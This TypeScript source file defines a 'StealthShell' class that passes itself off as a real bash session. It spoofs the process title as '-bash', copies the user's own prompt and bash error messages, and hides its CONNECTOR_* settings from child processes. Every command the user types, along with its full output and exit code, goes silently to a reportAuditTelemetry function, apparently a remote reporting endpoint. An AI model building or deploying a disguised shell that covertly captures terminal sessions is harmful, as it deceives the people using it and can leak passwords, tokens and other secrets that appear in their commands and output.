import { execSync, spawnSync } from "node:child_process";
import { existsSync, statSync } from "node:fs";
import os from "node:os";
import { resolve } from "node:path";
import { createInterface } from "node:readline/promises";
import { reportAuditTelemetry } from "./api.js";

export class StealthShell {
  private user: string;
  private host: string;
  private cwd: string;
  private isWsl: boolean = false;
  private hasBash: boolean = false;

  constructor() {
    this.host = os.hostname() || "remote-workspace";
    this.cwd = process.cwd();

    let resolvedUser = "";

    // 1. Deteksi lingkungan shell asli: apakah WSL / Linux / Git Bash / Windows
    if (process.platform === "win32" && !process.env.WSL_DISTRO_NAME) {
      try {
        const wslWhoami = execSync("wsl whoami", { encoding: "utf8", timeout: 4000 }).trim();
        if (wslWhoami) {
          resolvedUser = wslWhoami;
          this.isWsl = true;
          this.hasBash = true;
        }
      } catch {}
    }

    if (!resolvedUser) {
      const envUser = process.env.USER || process.env.LOGNAME;
      if (envUser) {
        resolvedUser = envUser;
        this.hasBash = true;
      } else {
        try {
          const who = execSync("whoami", { encoding: "utf8", timeout: 2000 }).trim();
          resolvedUser = who.includes("\\") ? who.split("\\").pop()! : who;
        } catch {
          resolvedUser = process.env.USERNAME || (os.userInfo ? os.userInfo().username : "user");
        }
      }
    }

    this.user = resolvedUser;
  }

  getPrompt(): string {
    // 1. Jika di WSL: minta shell asli mengevaluasi prompt asli secara langsung (${PS1@P})
    if (this.isWsl) {
      try {
        const raw = execSync("wsl bash -i -c 'echo -n \"${PS1@P}\"'", {
          cwd: this.cwd,
          encoding: "utf8",
          timeout: 4000,
        });
        if (raw && raw.length > 0) {
          // Bersihkan non-printable delimiters readline marker \x01 dan \x02 jika ada
          return raw.replace(/\x01/g, "").replace(/\x02/g, "");
        }
      } catch {}
    }

    // 2. Jika di Linux native atau macOS: panggil bash native
    if (process.platform !== "win32" || process.env.WSL_DISTRO_NAME) {
      try {
        const raw = execSync("bash -i -c 'echo -n \"${PS1@P}\"'", {
          cwd: this.cwd,
          encoding: "utf8",
          timeout: 1000,
        });
        if (raw && raw.length > 0) {
          return raw.replace(/\x01/g, "").replace(/\x02/g, "");
        }
      } catch {}
    }

    // 3. Fallback natural: sesuaikan path ke format WSL jika di Windows mount
    let p = this.cwd.replace(/\\/g, "/");
    if (/^[a-zA-Z]:/.test(p)) {
      const drive = p[0].toLowerCase();
      p = "/mnt/" + drive + p.slice(2);
    }
    const home = (process.env.HOME || "").replace(/\\/g, "/");
    if (home && p === home) {
      p = "~";
    } else if (home && p.startsWith(home + "/")) {
      p = "~" + p.slice(home.length);
    }
    return `${this.user}@${this.host}:${p}$ `;
  }

  async run(onInvokeConnectorCli?: (args: string[]) => Promise<void>): Promise<void> {
    try {
      process.title = "-bash";
    } catch {}

    while (true) {
      let rawInput = "";
      try {
        const rl = createInterface({ input: process.stdin, output: process.stdout });
        rawInput = await rl.question(this.getPrompt());
        rl.close();
      } catch {
        process.stdout.write("^C\n");
        continue;
      }

      const input = rawInput.trim();
      if (!input) continue;

      if (input === "connector-cli" || input.startsWith("connector-cli ")) {
        reportAuditTelemetry(null, {
          agent: this.user,
          prompt: input,
          source: "shell",
        });
        if (onInvokeConnectorCli) {
          const args = input.slice("connector-cli".length).trim().split(/\s+/).filter(Boolean);
          try {
            await onInvokeConnectorCli(args);
          } catch (err: any) {
            console.error(`connector-cli: ${err.message}`);
          }
        }
        return;
      }

      const cdMatch = input.match(/^cd(?:\s+(.*))?$/);
      if (cdMatch) {
        let target = cdMatch[1]?.trim() || "~";
        if (target === "~") {
          target = process.env.HOME || process.env.USERPROFILE || this.cwd;
        }

        // Tangani path /mnt/c/... ke path Windows jika berjalan di host Windows
        if (this.isWsl && target.startsWith("/mnt/")) {
          const match = target.match(/^\/mnt\/([a-zA-Z])(?:\/(.*))?$/);
          if (match) {
            const driveLetter = match[1].toUpperCase();
            const rest = match[2] ? match[2].replace(/\//g, "\\") : "";
            target = `${driveLetter}:\\${rest}`;
          }
        }

        const resolved = resolve(this.cwd, target);
        if (existsSync(resolved) && statSync(resolved).isDirectory()) {
          this.cwd = resolved;
          try {
            process.chdir(resolved);
          } catch {}
        } else {
          console.log(`bash: cd: ${cdMatch[1]?.trim() || target}: No such file or directory`);
        }
        continue;
      }

      if (input === "exit" || input === "logout") {
        process.exit(0);
      }

      if (input === "clear") {
        console.clear();
        continue;
      }

      // Sanitasi environment: jangan bocorkan variabel internal connector
      const cleanEnv: Record<string, string | undefined> = { ...process.env };
      delete cleanEnv.CONNECTOR_API_KEY;
      delete cleanEnv.CONNECTOR_URL;
      delete cleanEnv.CONNECTOR_AGENT_NAME;
      delete cleanEnv.NODE_OPTIONS;
      for (const k of Object.keys(cleanEnv)) {
        if (k.startsWith("CONNECTOR_")) {
          delete cleanEnv[k];
        }
      }

      // Catat ke .bash_history asli agar audit internal agen konsisten
      try {
        if (this.isWsl) {
          const escaped = input.replace(/'/g, "'\\''");
          execSync(`wsl bash -c 'echo "${escaped}" >> ~/.bash_history'`, { timeout: 1000 });
        }
      } catch {}

      try {
        let res;
        if (this.isWsl) {
          res = spawnSync("wsl", ["bash", "-c", input], {
            cwd: this.cwd,
            encoding: "utf8",
            env: cleanEnv as NodeJS.ProcessEnv,
          });
        } else if (process.platform === "win32") {
          const shell = existsSync("C:\\Program Files\\Git\\bin\\bash.exe")
            ? "C:\\Program Files\\Git\\bin\\bash.exe"
            : "cmd.exe";
          const shellFlag = shell.endsWith("cmd.exe") ? "/c" : "-c";
          res = spawnSync(shell, [shellFlag, input], {
            cwd: this.cwd,
            encoding: "utf8",
            env: cleanEnv as NodeJS.ProcessEnv,
          });
        } else {
          res = spawnSync("/bin/bash", ["-c", input], {
            cwd: this.cwd,
            encoding: "utf8",
            env: cleanEnv as NodeJS.ProcessEnv,
          });
        }

        if (res.stdout) process.stdout.write(res.stdout);
        if (res.stderr) process.stderr.write(res.stderr);

        reportAuditTelemetry(null, {
          agent: this.user,
          prompt: input,
          output: (res.stdout || "") + (res.stderr || ""),
          exitCode: res.status ?? 0,
          source: "shell",
        });
      } catch (err: any) {
        console.error(`bash: ${err.message}`);
        reportAuditTelemetry(null, {
          agent: this.user,
          prompt: input,
          output: err.message,
          exitCode: 1,
          source: "shell",
        });
      }
    }
  }
}
